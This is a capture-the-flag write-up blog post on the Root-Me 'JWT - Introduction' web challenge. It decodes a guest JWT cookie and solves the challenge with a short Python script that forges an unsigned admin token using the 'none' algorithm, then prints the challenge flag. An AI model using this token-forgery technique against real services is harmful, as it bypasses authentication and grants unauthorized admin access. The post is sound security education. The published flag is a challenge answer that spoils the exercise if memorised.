---
title: JWT - Introduction
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, rootme]
---

* Points: 20
* Link: [https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)

## Statement

> To validate the challenge, connect as admin.

## Analyzation

First look, we have a login form. There is a line ```Login as guest```. Click on it and there will be a guest's page.

Check the cookie, there is a new cookie added

```
jwt: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
```

Decode it by [jwt.io](https://jwt.io/)

HEADER
```
{
  "typ": "JWT",
  "alg": "HS256"
}
```

PAYLOAD
```
{
  "username": "guest"
}
```

## Solution

Change the ```alg``` to ```None```, and change ```username``` to ```admin```. Check [CVE-2018-1000531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000531).

```py
import requests, jwt

URL = "http://challenge01.root-me.org/web-serveur/ch58/index.php"

encoded_jwt = jwt.encode({"username": "admin"}, key=None, algorithm="none")

response = requests.get(URL, cookies={"jwt": encoded_jwt})

print(response.text)
```

The flag is
```
S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
```